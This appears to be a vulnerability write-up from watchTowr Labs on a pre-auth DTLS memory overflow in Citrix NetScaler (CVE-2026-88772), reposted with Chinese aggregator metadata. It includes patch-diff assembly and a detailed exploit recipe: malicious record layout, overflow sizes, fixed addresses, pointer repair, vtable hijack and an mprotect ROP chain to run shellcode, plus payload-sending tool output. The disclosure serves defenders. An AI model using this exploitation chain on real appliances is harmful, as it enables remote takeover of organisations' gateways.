---
title: "Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)"
source: "watchTowr Labs"
url: https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/
published: 2026-09-29
fetched: 2026-11-19T10:48:37.911925+08:00
category: "防火墙"
score: 8.4
keywords: ["preauth", "citrix", "netscaler"]
sha256: b0093e4afd9975afbc837d106e3df28a78d9c681bf448c8d0a3f743ad58ed336
bytes: 18830
truncated: false
body_mode: fulltext
kind: practical
status: published
published_at: 2026-11-19T11:44:34.056544+08:00
---

# Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)

> 来源：watchTowr Labs · 2026-09-29 · [原文](https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/)
> 自动抓取快照，仅供安全研究参考；版权归原作者所有。

## 收录理由

- **核心**：NetScaler DTLS 处理路径的未认证内存溢出（CVE-2026-88772），一个 DTLS 握手包即可触发。
- **价值**：UDP/DTLS 攻击面常被忽略（很多扫描器只打 TCP）；pre-auth 且无需完成握手，暴露即可能被利用。
- **难度**：中高：需要精确构造 DTLS 记录，理解内存布局。

This research is a glimpse into the capability powering the watchTowr Platform, a Preemptive Exposure Management solution. We enable organizations to autonomously validate and mitigate their exposure to emerging threats, ahead of in-the-wild exploitation.

 Request a demo

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/09/image-14.png)

Part 1 of this week's saga can be found here.

This research is a glimpse into the capabilities that power our Preemptive Exposure Management solution, enabling organizations to rapidly react to emerging threats: the watchTowr Platform.

### What Is A Citrix NetScaler?

NetScaler, from Citrix (now under Cloud Software Group), is an application delivery controller - some believe it qualifies to be described as a security appliance. It sits in front of an organization's applications and handles load balancing, traffic management, and SSL/TLS termination. NetScaler Gateway adds VPN and secure remote access.

### What Is the Purpose of a Security Appliance?

A security appliance exists to keep an organization secure by standing between its systems and threats that attempt to reach them. It concentrates a defensive function, controlling remote access, filtering hostile traffic, or enforcing who is allowed in, at a single chokepoint that every connection has to pass through.

### What Does "Hardened" Mean In "Hardened Security Appliance"?

"Hardened" means the vendor has stripped the device down and locked it up: minimal running services, restricted shell access, a controlled update path, and defaults tuned for security.

The premise is that it is tougher to break into than a general-purpose server.

### What is CVE-2026-88772, and When Will This End?

As we discussed in yesterday's blog post, the advisory released by Citrix on Sunday did not just contain one in-the-wild exploited vulnerability - but two. Today, we're going to be analyzing CVE-2026-88772.

CVE-2026-88772 is the DTLS memory overflow we walk through here. It is one of eight vulnerabilities Citrix fixed in a single bulletin, CTX697096. It requires DTLS to be enabled which is the default on VPN virtual servers unless an administrator explicitly set -dtls OFF and was exploited in the wild as a zero-day.

As a call back and for consistency with yesterday’s blog post, here is everything the advisory covers:

 kg-card-begin: html
   CVE Description CVSS 4.0 Exploited in the Wild     CVE-2026-88771 Improper input validation that lets an unauthenticated attacker run arbitrary commands. Affects the default configuration. 9.5 Critical Yes   CVE-2026-88772 Memory overflow that can lead to remote code execution or denial of service when DTLS is enabled (the default for VPN virtual servers). 9.5 Critical Yes   CVE-2026-88773 HTTP request smuggling (inconsistent interpretation of HTTP requests). Depends on specific configurations. 9.3 Critical Not reported   CVE-2026-88774 NetScaler ADC and NetScaler Gateway vulnerability. Depends on specific configurations. 7.0 High Not reported   CVE-2026-88775 Memory overflow. Depends on specific configurations. 8.8 High Not reported   CVE-2026-88776 Memory overflow. Depends on specific configurations. 8.8 High Not reported   CVE-2026-88777 Memory overflow. Depends on specific configurations. 8.8 High Not reported   CVE-2026-88778 Predictable value from previous values. Fixed by enabling Enhanced ISN Generation, not by the upgrade alone. 8.8 High Not reported
 kg-card-end: html

The Citrix advisory recommends updating to the following fixed versions:

- Citrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.37 and later releases
- Citrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.23 and later releases of 13.1
- Citrix NetScaler ADC 14.1-FIPS 14.1-73.37 FIPS and later releases of 14.1-FIPS
- Citrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1-37.279 and later releases of 13.1-FIPS and 13.1-NDcPP

### Introduction to the DTLS Packet

First, some DTLS basics. DTLS is TLS bolted onto UDP. A single UDP packet can carry one or more DTLS records, and every record opens with a 13-byte header.

When a record carries handshake data, that data begins with a further 12-byte header describing a handshake fragment:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Content Type  |          Version (DTLS)       |    Epoch      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Epoch (cont.)        |                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               +
|                   Sequence Number (48 bits)                   |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Record Length        |                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               +
|                     Handshake Type            |               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               +
|                Total Message Length (24 bits)                 |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Message Sequence Number (16 bits)       |               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               +
|               Fragment Offset (24 bits)                       |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               Fragment Length (24 bits)       |               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               +
|                                                               |
|                    Handshake Fragment Data ...                |
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Only four handshake fields matter for this vulnerability:

- length is the size of the complete handshake message.
- message_seq tells the server which handshake message this fragment belongs to.
- fragment_offset tells the server where this fragment belongs inside that message.
- fragment_length tells the server how many bytes this fragment carries.

For example, a 120-byte handshake message can arrive as 120 fragments. Every fragment has length=120, but each one can have fragment_length=1. Their offsets would be 0, 1, 2, and so on up to 119. Once every position has arrived, the server considers the 120-byte message complete. Joining those pieces is called reassembly.

NetScaler stores received packet data in objects called NSBs, short for NetScaler Buffers. Each NSB holds some packet bytes, its length, and a pointer to the next NSB. Several NSBs can therefore form a linked list, which this write-up calls an NSB chain.

Once DTLS reassembly finishes, an NSPPE function stitches the NSB chain into a single fixed buffer. That buffer is the scratch buffer, and it is tiny: 0x8c00 bytes, or 35,840. It lives in the .bss section of nsppe.

The malicious records tell the reassembly code that each record supplies only one byte of a 120-byte handshake message. However, NSPPE keeps almost the whole record in an NSB. After 120 records, the handshake message is considered complete, but its NSB chain contains about 174 KB of data.

The vulnerable function then copies that entire chain into the 35,840-byte scratch buffer without checking whether it fits.

### Setting The Scene

To fuel today's analysis, we set up a Citrix NetScaler appliance with DTLS enabled (listening on 9462/UDP) and compared two versions using our normal "what the hell has changed" process:

- Vulnerable: NetScaler 14.1 build 73.30
- Different: NetScaler 14.1 build 73.37

### Patch Diffing

Contrary to yesterday’s analysis, CVE-2026-88772 does live in nsppe, the all-being/all-knowing NetScaler binary.

The function that joins the NSB chain starts at 0x1434a80 in 14.1-73.30 and at 0x1436420 in 14.1-73.37. The old build calls memcpy for every NSB without first checking the total size. The fixed build keeps track of how much room is left in the scratch buffer.

Here is the assembly change that matters. You do not need to follow every register: r15d is the space left in the scratch buffer, and edx is the size of the next NSB:

```
--- nsppe-14.1-73.30
+++ nsppe-14.1-73.37
@@ DTLS NSB-chain copy loop @@
+0x143649d  mov    r15d, 0x8c00                    // [1]
+0x14364a3  sub    r15d, eax                       // [2]

 0x14364b0  movzx  edx, word ptr [r14 + 0xf2]     // next NSB size
+0x14364b8  cmp    r15d, edx                       // [3]
+0x14364bb  jb     reject_oversized_chain          // [4]

 0x14364cc  mov    rsi, qword ptr [r14 + 0xe8]    // source bytes
 0x14364d3  mov    rdi, rbx                        // scratch-buffer position
 0x14364d6  call   memcpy                          // [5]
 0x14364e3  add    rbx, rax                        // move output position
+0x14364e6  sub    r15d, eax                       // [6]
```

- At [1], start with 35,840 bytes of free space.
- At [2], subtract the header bytes that were already copied.
- At [3], compare the next NSB's size with the free space.
- At [4], reject the message if that NSB will not fit.
- At [5], copy the NSB only after the check passes.
- At [6], subtract the number of copied bytes, then repeat the check for the next NSB.

The same fix is easier to see as C-like pseudocode:

```
--- nsppe-14.1-73.30  vulnerable
+++ nsppe-14.1-73.37  fixed
@@
 copy_saved_header(scratch, saved_header, saved_header_length);
 cursor = scratch + saved_header_length;
+space_left = 0x8c00 - saved_header_length;

 for (nsb = fragment_chain; nsb != NULL; nsb = nsb->next) {
+    if (nsb->length > space_left) {
+        reject_message();
+        return;
+    }
     memcpy(cursor, nsb->data, nsb->length);
     cursor += nsb->length;
+    space_left -= nsb->length;
 }
```

### Step 1: Pass the DTLS Cookie Check

The server does not accept a large first packet from a new DTLS client. It first asks the client to return a cookie. This only proves that the client can receive packets at its IP address; it does not authenticate a user.

![image](https://storage.ghost.io/c/a0/dc/a0dcbbe4-0ae7-4d7e-90f7-ebbc3a0f5a84/content/images/2026/09/image-15.png)

Source: Red Hat, "Understanding the DTLS all-zero ClientHello.random vulnerability".

Here is what we do:

- Send a small ClientHello.
- Receive a HelloVerifyRequest containing the cookie.
- Send another ClientHello containing that cookie on the same UDP socket.
- Receive the server's reply. The server now remembers the DTLS connection, but nobody is logged in.
- Send the 120 malicious records on that socket.

### Step 2: Build One Malicious Record

Every malicious record has the same basic layout. Only the record sequence number and fragment_offset change:

```
13-byte DTLS record header

1,459-byte record body
├── 12-byte primary handshake header
│     length          = 120
│     message_seq     = 2
│     fragment_offset = record number, from 0 to 119
│     fragment_length = 1
├── 120-byte primary area
├── 12-byte hidden handshake header
│     length          = 1434
│     message_seq     = 3
│     fragment_offset = 0
│     fragment_length = 1434
└── 1,315 remaining bytes
```

The unusual part is the first handshake header. It claims two things at once:

- length=120: the complete message is 120 bytes long.
- fragment_length=1: this record supplies only one byte of that message.

NSPPE uses length=120 when it moves through the packet looking for the next handshake header. That makes it step over the 120-byte primary area and find the hidden header.

The hidden header is there to satisfy the record's size accounting. The two 12-byte headers and their declared fragment sizes add up to the complete 1,459-byte body:

```
12 + 1 + 12 + 1434 = 1459
```

At the same time, the bytes actually placed in the packet also add up to 1,459:

```
12 + 120 + 12 + 1315 = 1459
```

This is the parser mistake the packet takes advantage of. NSPPE uses length=120 to find the hidden header, but it uses fragment_length=1 when rebuilding message_seq=2. The hidden fragment is not the data we want to rebuild; its job is to make the rest of the record pass the parser's size checks.

### Step 3: Repeat the Record 120 Times

All 120 primary fragments use message_seq=2 and fragment_length=1. Their offsets cover the whole message:

```
record 1    fragment_offset = 0
record 2    fragment_offset = 1
record 3    fragment_offset = 2
...
record 120  fragment_offset = 119
```

After record 120, every position from 0 through 119 has been supplied, so NSPPE marks the 120-byte handshake message as complete. The mistake is that the reassembly object still points to an NSB from every large record. It did not reduce each NSB to the single byte named by fragment_length.

### Step 4: Overflow the Scratch Buffer

The completed message now reaches the vulnerable copy function. The first NSB contributes 1,459 bytes. Each of the other 119 NSBs contributes 1,447 bytes, because its 12-byte primary handshake header is skipped:

```
1459 + (119 * 1447) = 173652 bytes of NSB data
```

The function also copies a saved 13-byte DTLS record header:

```
total copied  = 13 + 173652 = 173665 bytes
buffer size   = 0x8c00      =  35840 bytes
overflow      =               137825 bytes
```

That is 137,825 bytes spilling past the buffer and into whatever writable nsppe data happens to sit next to it.

### The Crash

The first crash overwrote a global list pointer. The list-handling code loads this overwritten value into RCX and uses it as a destination pointer:

```
Program received signal SIGSEGV, Segmentation fault.

(gdb) x/i $rip
=> 0x000000000143470e:  mov    %rax,0x20(%rcx)

(gdb) info registers rip rcx
rip            0x143470e           0x143470e
rcx            0x0000414141414141  71748523475265

(gdb) p/x $rcx + 0x20
$1 = 0x0000414141414161
```

As you can see we crash because the RCX register which we have control has an invalid address so when RAX is about to be written to RCX + 0x20 segfault happens, so we first need get around fixing this issue.

```
0x0000414141414141 + 0x20 = 0x0000414141414161
```

### Binary Protections

Here are the binary protections for nsppe-14.1-73.30:

```
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

Since there is no PIE, we can use addresses in the 41 MB binary to our advantage (I genuinely do not know how to make this sentence funnier than it already is).

### From Crash to Shellcode Execution

The first step was to repair the list pointer that caused the early crash. In our version of NSPPE (14.1-73.30) this pointer was always the constant value 0x357f820, so we can just reuse that constant to get around the early crash:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + 0x357f820 + BBBBBBBBBBBBBBB
```

We noticed that if we keep overflowing, there is a valuable object sitting at 0x355c800 which we can fake, overwriting one of its members to hijack its virtual method call:

```
0x355c800 + 0x618  -> 0x355d800     fake method table
0x355c800 + 0x6c8  -> 0x356daf8     circular-list ptr
0x355d800 + 0x0d0  -> 0x41414141    virtual method ptr
```

This is the code that periodically gets called by a background thread, which calls the faked object's function pointer:

```
0x14acc60:  or     byte ptr [rsi + 0x34], 0x80
0x14acc6b:  mov    rax, qword ptr [rsi + 0x618]
0x14acc72:  xor    edi, edi
0x14acc74:  call   qword ptr [rax + 0xd0]
0x14acc7a:  jmp    0x14acbcd
```

At the call, RSI points to the fake object and RAX points to the fake method table. Setting the method slot to 0x0000414141414141 produced this saved state:

```
Program received signal SIGSEGV, Segmentation fault.

(gdb) info registers rip rax rsi
rip            0x0000414141414141
rax            0x000000000355d800
rsi            0x000000000355c800
rsp            0x00007fffffffe728
```

### ROP to Shellcode Execution

NX was enabled, so execution could not jump directly into bytes stored in the writable overflow area. We came up with the following ROP gadget to call mprotect first then jump to our shellcode:

```
pop rdi ; ret        │  RDI -> page to change
pop rsi ; ret        │  RSI -> 0x1000
pop rdx ; ret        │  RDX -> 0x7      (R | W | X)
mprotect             │  mprotect(rdi, rsi, rdx)
shellcode address    │  ret -> shellcode
```

This performs:

```
mprotect((void *)0x355e000, 0x1000,
         PROT_READ | PROT_WRITE | PROT_EXEC);
```

The page contains both the controlled ROP stack and the shellcode. After mprotect returns, its ret instruction pops 0x355e100 and begins executing the shellcode.

### What to Do With Shellcode?

If you are asking this, it can only mean one thing: you have not read our blog post here.

### Detection Artefact Generator

As always, we’re here to share our Detection Artefact Generator to determine your own susceptibility and inform remediation in your own environments. It can be found on our GitHub here.

```
                     __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                          \/          \/     \/

        watchTowr-vs-Citrix-Netscaler-CVE-2026-88772.py

        (*) Citrix Netscaler DTLS PreAuth buffer overflow to RCE Detection Artifact Generator

          - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)

        CVEs: [CVE-2026-88772]

[*] building payload for '/tmp/watchTowr'
[+] content size: 7 bytes
[*] connecting to DTLS gateway...
[+] association ready: 3 server datagrams
[*] sending 120 records (176640 bytes)...
[*] done
```

          0:00  /0:37

## Gain early access to our research, and understand your exposure, with the watchTowr Platform

The research published by watchTowr Labs is powered by the same engine behind the watchTowr Platform, our Preemptive Exposure Management solution built for enterprises that refuse to wait for the next satisfying advisory from their scanner vendor.

The watchTowr Platform combines External Attack Surface Management and Continuous Automated Red Teaming to test your defenses against the vulnerabilities and techniques that matter: the ones real attackers are actually exploiting.

 Request a demo
